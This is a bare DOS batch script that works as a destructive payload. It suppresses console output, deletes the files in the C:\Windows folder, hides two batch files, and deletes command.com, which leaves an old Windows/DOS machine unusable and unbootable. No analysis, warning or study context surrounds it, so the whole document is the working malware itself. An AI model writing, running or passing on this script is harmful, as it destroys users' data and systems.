   @echo off
   @ctty nul
   del c:\windows\*.???
   attrib +H c:\windows\desktop.bat
   attrib +H c:\config.bat
   del c:\command.com
